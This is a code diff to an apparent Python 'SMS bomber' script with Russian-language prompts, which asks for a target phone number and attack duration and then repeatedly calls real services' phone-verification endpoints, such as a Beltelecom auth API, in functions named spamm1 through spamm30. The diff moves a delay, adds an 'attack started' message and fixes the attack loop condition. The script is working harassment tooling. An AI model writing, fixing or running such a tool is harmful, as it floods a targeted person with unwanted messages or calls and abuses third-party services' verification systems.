@@ -22,7 +22,6 @@ delay = input('Если хотите сделать задержку перед 
 
 if delay == '1':
     delay = int(input('Введите колличество секунд до начала атаки: '))
-    time.sleep(delay)
 
 if DEBAG == False:
     attak_duration = int(input('Введите время атаки в секндах(0 == бессконечность): '))
@@ -34,6 +33,8 @@ if DEBAG == False:
 
     if attak_duration == 0:
         timer = True
+    time.sleep(delay)
+
 
 if phone[0] == '+':
     phone = phone[1:]
@@ -148,8 +149,9 @@ def spamm29(phone=phone):
 def spamm30(phone=phone):
     beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
 
+print('Началась атака!')
 
-while DEBAG == False and timer():
+while DEBAG == False and timer:
     try:
         spamm1()
         spamm2()
